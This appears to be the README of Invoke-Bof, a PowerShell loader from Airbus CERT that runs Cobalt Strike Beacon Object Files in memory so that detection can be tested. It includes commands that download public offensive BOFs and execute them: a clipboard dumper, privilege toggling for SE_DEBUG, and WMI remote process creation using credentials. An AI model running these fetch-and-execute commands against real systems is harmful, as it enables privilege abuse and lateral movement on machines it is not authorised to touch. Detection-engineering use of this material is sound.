# Invoke-Bof
Load any Beacon Object File using Powershell!

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/airbus-cert/Invoke-Bof/raw/main/test/test_invoke_bof.x64.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "toto",14

██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  
██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  
██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     
╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     
                                               
  [v0.1 Made with love by Airbus CERT https://github.com/airbus-cert]

[+] Mapping of .text    at  0x19924310000
[+] Mapping of .rdata   at  0x19924320000
[+] Mapping of .xdata   at  0x19924330000
[+] Mapping of .pdata   at  0x19924540000
[+] Mapping of /4       at  0x19924550000
[+] Jump into beacon at 0x19924310000
****************************************************************************
Test Beacon for Invoke-Bof
Argument 1 : toto
Argument 2 : 14

=============================== Beacon Output ==============================
00000000   66 6F 6F 00 6F 00 00 00 62 61 72 20 32 32 32 33  foo.o...bar 2223
00000010   33 33                                            33              
============================================================================
[+] Clipboard updated !
[!] Active Windows : Windows PowerShell ISE
[!] Content : $BOFBytes = [IO.File]::ReadAllBytes($Path)
****************************************************************************
```

CobaltStrike appears to be the favoured offensive framework, used by a large majority of the offensive side of cybersecurity.

The framework is very extensible and allows Red Teamers to develop specific offensive modules named BOF, short for Beacon Object File. Beacons are what CobaltStrike calls their agents, or final payloads.

A Beacon Object File is split into two parts:

* A payload that will be executed on the victim machine
* An aggressor script, which will prepare and interact with the payload

Many Red Teams publish BOFs on their public GitHub repositories, implementing lateral movement, vulnerability, attack, or persistence. Instead of reimplementing these techniques each time we want to try and detect them, We decided to find a way to execute them directly.

# Get-Help Invoke-Bof

|Parameter|help|
|----------|-----------|
|`BOFBytes`| A byte array containing the beacon object file to load and execute. Loading a BOF from a local file : </br>```$BOFBytes = [IO.File]::ReadAllBytes("c:\my_bof.o")```</br>A BOF hosted on a repository : </br>```$BOFBytes = (Invoke-WebRequest -Uri "https://github.com/airbus-cert/Invoke-Bof/raw/main/test/test_invoke_bof.x64.o").Content```|
| `EntryPoint` | Name of the function to call (the convention is to name the entry point __go__) |
| `ArgumentList` | List of all arguments that will be passed to the main function. For example marshall two arguments, the first as string, the second as integer : <br>```Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "toto",14``` </br>To know the parameters accepted by a BOF, please take a look at the aggressor script.|
| `UnicodeStringParameter` | Marshal all string parameters as UTF-16LE strings |

Example :

```
$BOFBytes = (Invoke-WebRequest -Uri "https://github.com/airbus-cert/Invoke-Bof/raw/main/test/test_invoke_bof.x64.o").Content
Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "toto",14
```

# How does it works?

✈️ If you want to know what is behind the scene, please read the dedicated [blog post](https://skyblue.team/posts/invoke-bof/) !!! ✈️

# Launch Every Beacon Carefully!

Now we can launch every beacon available from Github. For example, we can test a beacon that dumps our clipboard:

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/DallasFR/BOF_dumpclip/raw/main/dump.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go



██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  
██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  
██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     
╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     
                                               
  [v0.1 Made with love by Airbus CERT https://github.com/airbus-cert]



[+] Mapping of .text    at  0x133e0c20000
[+] Mapping of .rdata   at  0x133e0c30000
[+] Mapping of .xdata   at  0x133e0c40000
[+] Mapping of .pdata   at  0x133e0c50000
[+] Mapping of /4       at  0x133e0c60000
[+] Jump into beacon at 0x133e0c20000
****************************************************************************
[+] Clipboard updated !
[!]Active Windows : Windows PowerShell ISE
[!] Content : $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/DallasFR/BOF_dumpclip/raw/main/dump.o").Content
Invoke-Bof -BOFBytes $BOFBytes  -EntryPoint go
----------------------------------

****************************************************************************

```

We can try to detect an attacker that tries to enable *SE_DEBUG* privilege:

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/EspressoCake/Toggle_Token_Privileges_BOF/raw/main/dist/toggle_privileges_bof.x64.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint enable -ArgumentList 20



██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  
██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  
██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     
╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     
                                               
  [v0.1 Made with love by Airbus CERT https://github.com/airbus-cert]



[+] Mapping of .text    at  0x133e0ab0000
[+] Mapping of .data    at  0x133e0bf0000
[+] Mapping of .xdata   at  0x133e0c20000
[+] Mapping of .pdata   at  0x133e0c30000
[+] Mapping of .rdata   at  0x133e0c40000
[+] Mapping of /4       at  0x133e0c50000
[+] Jump into beacon at 0x133e0ab0c10
****************************************************************************
Authors:
	@the_bit_diddler
	@hackersoup

You are not currently in an administrative session. Come again later!

****************************************************************************


```

You want to execute a process using WMI create process:

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/Yaxser/CobaltStrike-BOF/raw/master/WMI%20Lateral%20Movement/ProcCreate.x64.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "\\COMPUTER\ROOT\CIMV2","domain","username","username","cmd.exe /C powershell.exe",1 -UnicodeStringParameter


██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗
██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝
██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║
╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝

  [v0.1 Made with love by Airbus CERT https://github.com/airbus-cert]



[+] Mapping of .text at  0x2e940940000
[+] Mapping of /4 at  0x2e95a880000
[+] Mapping of /30 at  0x2e95a890000
[+] Mapping of /57 at  0x2e95a8f0000
[+] Mapping of /84 at  0x2e95a900000
[+] Mapping of /110 at  0x2e95b160000
[+] Mapping of /137 at  0x2e95b170000
[+] Mapping of /164 at  0x2e95b180000
[+] Mapping of /193 at  0x2e95b190000
[+] Mapping of /223 at  0x2e95b1a0000
[+] Mapping of .xdata at  0x2e95b1b0000
[+] Mapping of .pdata at  0x2e95b1c0000
[+] Mapping of .rdata at  0x2e95b1d0000
[+] Mapping of /253 at  0x2e95b1e0000
[+] Mapping of /277 at  0x2e95b1f0000
[+] Mapping of /301 at  0x2e95b200000
[+] Mapping of /325 at  0x2e95b230000
[!] Unable to parse API name :  _ZTV10_com_error  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_error4DtorEv  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_errorD1Ev  /!\ continue without resolving /!\
[!] Unable to parse API name :  __imp_LocalFree  /!\ continue without resolving /!\
[!] Unable to parse API name :  _Unwind_Resume  /!\ continue without resolving /!\
[!] Unable to parse API name :  __cxa_call_unexpected  /!\ continue without resolving /!\
[!] Unable to parse API name :  __gxx_personality_seh0  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZTI10_com_error  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_errorD1Ev  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_errorD0Ev  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZTVN10__cxxabiv117__class_type_infoE  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZTS10_com_error  /!\ continue without resolving /!\
[+] Jump into beacon at 0x2e940940181
****************************************************************************
ExecMethod Succeeded!
****************************************************************************
```
